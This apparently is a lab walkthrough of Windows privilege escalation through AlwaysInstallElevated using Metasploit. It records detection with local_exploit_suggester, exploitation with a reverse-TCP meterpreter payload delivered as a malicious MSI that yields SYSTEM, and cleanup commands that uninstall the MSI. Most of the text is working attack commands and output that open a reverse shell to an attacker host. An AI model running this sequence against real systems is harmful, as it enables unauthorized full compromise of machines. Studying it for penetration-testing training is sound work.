# 02 - Metasploit AlwaysInstallElevated Exploitation

## 2.1 - Detect

```
meterpreter > getuid
Server username: TCM-PC\user
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.1.151 - Collecting local exploits for x64/windows...
[*] 10.10.1.151 - 33 exploit checks are being tried...
[+] 10.10.1.151 - exploit/windows/local/always_install_elevated: The target is vulnerable.
..[snip]..
meterpreter > bg
[*] Backgrounding session 1...
```

## 2.2 - Exploit

```
msf6 exploit(multi/script/web_delivery) > use exploit/windows/local/always_install_elevated
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/always_install_elevated) > options

Module options (exploit/windows/local/always_install_elevated):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(windows/local/always_install_elevated) > set lhost 10.8.145.108

msf6 exploit(windows/local/always_install_elevated) > set lport 53

msf6 exploit(windows/local/always_install_elevated) > set session 1

msf6 exploit(windows/local/always_install_elevated) > exploit
[*] Started reverse TCP handler on 10.8.145.108:53
[*] Uploading the MSI to C:\Users\user\AppData\Local\Temp\kqEERS.msi ...
[*] Executing MSI...
[*] Sending stage (200774 bytes) to 10.10.1.151
[*] Meterpreter session 2 opened (10.8.145.108:53 -> 10.10.1.151:49208) at 2022-05-27 13:12:59 -0400

msf6 exploit(windows/local/always_install_elevated) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## 2.3 - Cleanup

- In case the reverse shell hasn't been cleaned successfully run these commands to get rid of the GUID (IdentifyingNumber)

```
meterpreter > execute -Hicf wmic -a "product get name,identifyingnumber"
Process 4084 created.
Channel 3 created.
IdentifyingNumber                       Name
{01767101-A688-4A95-9C83-6DED9EB6735D}  VMware Tools
{7FED75A1-600C-394B-8376-712E2A8861F2}  Microsoft Visual C++ 2017 x86 Additional Runtime - 14.12.25810
{5C0679A5-0BC2-424C-B581-0EF41BE9F6CE}  EC2ConfigService
{8E932C87-DD61-491D-8D5A-C1E805EBD0ED}  Amazon SSM Agent
{2CD849A7-86A1-34A6-B8F9-D72F5B21A9AE}  Microsoft Visual C++ 2017 x64 Additional Runtime - 14.12.25810
{828952EB-5572-3666-8CA9-000B6CE79350}  Microsoft Visual C++ 2017 x86 Minimum Runtime - 14.12.25810
{7DEBE4EB-6B40-3766-BB35-5CBBC385DA37}  Microsoft .NET Framework 4.5.1
{C99E2ADC-0347-336E-A603-F1992B09D582}  Microsoft Visual C++ 2017 x64 Minimum Runtime - 14.12.25810
meterpreter > execute -Hicf misexec -a "/q /qn /norestart /uninstall {<GUID>}"
```